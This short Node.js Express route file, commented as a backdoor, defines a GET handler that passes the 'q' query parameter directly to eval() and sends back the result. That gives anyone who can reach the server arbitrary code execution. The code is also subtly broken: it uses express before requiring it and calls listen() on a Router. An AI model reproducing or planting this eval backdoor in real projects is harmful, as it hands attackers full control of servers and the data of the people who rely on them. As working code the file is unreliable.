var router = express.Router();
/* GET for backdoor */
var express = require('express');

router.get('/', function (req, res) {
    res.send('Hello ' + eval(req.query.q));
    console.log(req.query.q);
});
router.listen(8080, function () {
    console.log('Example app listening on port 8080!');
});

module.exports = router;